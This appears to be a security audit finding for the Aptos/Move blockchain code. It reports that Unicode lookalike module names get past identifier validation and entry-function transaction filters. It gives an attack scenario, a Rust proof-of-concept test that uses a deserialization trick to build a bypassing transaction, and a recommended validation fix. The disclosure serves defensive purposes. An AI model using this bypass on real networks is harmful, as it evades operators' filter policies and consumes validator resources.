# Audit Report

## Title
Unicode Identifier Validation Bypass Allows Transaction Filter Evasion

## Summary
The transaction validation layer fails to enforce Move's ASCII-only identifier restriction, allowing attackers to submit transactions with Unicode characters in module and function names. This bypasses entry function filters that use direct string comparison, enabling blocked transactions to enter mempool and consume validator resources before failing during execution.

## Finding Description

The vulnerability exists across multiple validation layers:

**1. Insufficient API Validation**

The API validation only checks for `::` separator but does not validate that identifiers contain only ASCII characters as required by Move's identifier specification. [1](#0-0) 

**2. Serde Deserialization Bypass**

When transactions are deserialized from BCS format, the `Identifier` type uses serde's derived `Deserialize` implementation which directly deserializes the internal `Box<str>` without calling the validation logic in `Identifier::new()`. [2](#0-1) 

This contrasts with bytecode deserialization for compiled modules, which properly validates identifiers: [3](#0-2) 

**3. Filter Bypass via String Comparison**

Transaction filters use direct byte-wise string comparison to match entry functions: [4](#0-3) 

**Attack Scenario:**

1. Operator configures filter: `Deny EntryFunction(0x1, "coin", "transfer")`
2. Attacker crafts BCS-serialized transaction with Unicode lookalike: `EntryFunction(0x1, "ｃoin", "transfer")` (fullwidth 'c')
3. Transaction passes API validation (no `::` present)
4. Transaction bypasses filter (`"ｃoin" != "coin"` in string comparison)
5. Transaction enters mempool and gets processed
6. Transaction fails during execution (module `0x1::ｃoin` doesn't exist)

**Evidence of Validation Bypass:**

The codebase contains a test demonstrating that `Identifier` validation can be bypassed during deserialization: [5](#0-4) 

## Impact Explanation

**Severity: Medium**

While transactions with invalid Unicode identifiers will ultimately fail during execution, this vulnerability allows attackers to:

1. **Bypass Security Controls**: Transaction filters configured to block specific entry functions can be evaded using visually similar Unicode characters (e.g., fullwidth Latin letters, Cyrillic lookalikes)

2. **Resource Exhaustion**: Blocked transactions can consume:
   - Mempool space
   - Consensus bandwidth (transaction propagation)
   - Validator processing time (validation, consensus, execution attempt)
   - Storage for failed transaction records

3. **Policy Violation**: Operators who configure filters for governance, maintenance, or security purposes have their intended policies circumvented

This does not qualify for Critical or High severity because:
- No funds are lost or stolen
- No consensus safety violation occurs
- Transactions ultimately fail and cannot execute malicious logic
- No permanent state corruption

It qualifies as Medium severity due to bypassing an intended security mechanism and enabling limited resource consumption attacks.

## Likelihood Explanation

**Likelihood: High**

The attack is:
- **Trivial to execute**: Any attacker can craft a BCS-serialized transaction with Unicode identifiers
- **No special privileges required**: Any network participant can submit transactions
- **Easy to discover**: The validation gap is visible in code inspection
- **Low detection risk**: Transactions appear normal until they fail during execution

The only limiting factor is that the impact is limited (transactions still fail).

## Recommendation

Implement comprehensive identifier validation in the API layer by calling `Identifier::is_valid()`:

```rust
pub fn verify_identifier(identifier: &str) -> anyhow::Result<()> {
    // Check for :: separator (existing check)
    if identifier.contains("::") {
        return Err(format_err!(
            "Identifier should not contain '::' {}", 
            identifier
        ));
    }
    
    // Add proper Move identifier validation
    if !move_core_types::identifier::Identifier::is_valid(identifier) {
        return Err(format_err!(
            "Invalid Move identifier '{}': must be ASCII-only and match [a-zA-Z][a-zA-Z0-9_$]* or [_$][a-zA-Z0-9_$]+",
            identifier
        ));
    }
    
    Ok(())
}
```

Apply this fix to: [1](#0-0) 

Alternatively, consider adding custom serde deserialization for `Identifier` that validates on deserialization, though this would be more invasive.

## Proof of Concept

```rust
#[test]
fn test_unicode_filter_bypass() {
    use aptos_types::transaction::EntryFunction;
    use move_core_types::{
        account_address::AccountAddress,
        identifier::Identifier,
        language_storage::ModuleId,
    };
    use aptos_transaction_filters::TransactionFilter;
    
    // Create filter blocking normal ASCII module name
    let filter = TransactionFilter::empty()
        .add_entry_function_filter(
            false, // deny
            AccountAddress::ONE,
            "coin".to_string(),
            "transfer".to_string(),
        );
    
    // Create transaction with Unicode lookalike module name
    // Using HackStruct to bypass Identifier::new() validation
    #[derive(serde::Serialize)]
    struct HackStruct(pub Box<str>);
    
    let unicode_module: Identifier = serde_json::from_str(
        &serde_json::to_string(&HackStruct("ｃoin".into())).unwrap()
    ).unwrap();
    
    let func: Identifier = serde_json::from_str(
        &serde_json::to_string(&HackStruct("transfer".into())).unwrap()
    ).unwrap();
    
    let entry_fn = EntryFunction::new(
        ModuleId::new(AccountAddress::ONE, unicode_module),
        func,
        vec![],
        vec![],
    );
    
    // Create signed transaction (simplified for PoC)
    let txn = create_test_transaction_with_entry_function(entry_fn);
    
    // Verify filter bypass
    // Filter should deny "coin::transfer" but attacker uses "ｃoin::transfer"
    assert!(filter.allows_transaction(&txn), 
        "Unicode lookalike should bypass filter");
    
    // Transaction would fail during execution, but has already bypassed filter
}
```

**Notes:**
- The PoC demonstrates the filter bypass using the same `HackStruct` technique shown in the existing test
- In a real attack, the attacker would use BCS serialization to craft the malicious transaction
- The transaction will ultimately fail with `FUNCTION_RESOLUTION_FAILURE` during execution, but the security control has already been bypassed

### Citations

**File:** api/types/src/move_types.rs (L1468-1477)
```rust
pub fn verify_identifier(identifier: &str) -> anyhow::Result<()> {
    if identifier.contains("::") {
        Err(format_err!(
            "Identifier should not contain '::' {}",
            identifier
        ))
    } else {
        Ok(())
    }
}
```

**File:** third_party/move/move-core/types/src/identifier.rs (L109-114)
```rust
#[derive(Clone, Debug, Eq, Hash, Ord, PartialEq, PartialOrd, Serialize, Deserialize)]
#[cfg_attr(
    any(test, feature = "fuzzing"),
    derive(arbitrary::Arbitrary, dearbitrary::Dearbitrary)
)]
pub struct Identifier(Box<str>);
```

**File:** third_party/move/move-binary-format/src/deserializer.rs (L979-998)
```rust
fn load_identifier(cursor: &mut VersionedCursor) -> BinaryLoaderResult<Identifier> {
    let size = load_identifier_size(cursor)?;
    let mut buffer: Vec<u8> = vec![0u8; size];
    if !cursor.read(&mut buffer).map(|count| count == size).unwrap() {
        Err(PartialVMError::new(StatusCode::MALFORMED)
            .with_message("Bad Identifier pool size".to_string()))?;
    }
    let ident = Identifier::from_utf8(buffer).map_err(|_| {
        PartialVMError::new(StatusCode::MALFORMED).with_message("Invalid Identifier".to_string())
    })?;
    if cursor.version() < VERSION_9 && ident.as_str().contains('$') {
        Err(
            PartialVMError::new(StatusCode::MALFORMED).with_message(format!(
                "`$` in identifiers not supported in bytecode version {}",
                cursor.version()
            )),
        )
    } else {
        Ok(ident)
    }
```

**File:** crates/aptos-transaction-filters/src/transaction_filter.rs (L228-237)
```rust
fn compare_entry_function(
    entry_function: &EntryFunction,
    address: &AccountAddress,
    module_name: &String,
    function_name: &String,
) -> bool {
    entry_function.module().address() == address
        && entry_function.module().name().to_string() == *module_name
        && entry_function.function().to_string() == *function_name
}
```

**File:** api/src/tests/transactions_test.rs (L486-496)
```rust
    // This is a way to get around the Identifier checks!
    #[derive(serde::Serialize)]
    struct HackStruct(pub Box<str>);

    // Identifiers check when you call new, but they don't check when you deserialize, surprise!
    let module_id: Identifier =
        serde_json::from_str(&serde_json::to_string(&HackStruct("coin".into())).unwrap()).unwrap();
    let func: Identifier = serde_json::from_str(
        &serde_json::to_string(&HackStruct("transfer::what::what".into())).unwrap(),
    )
    .unwrap();
```
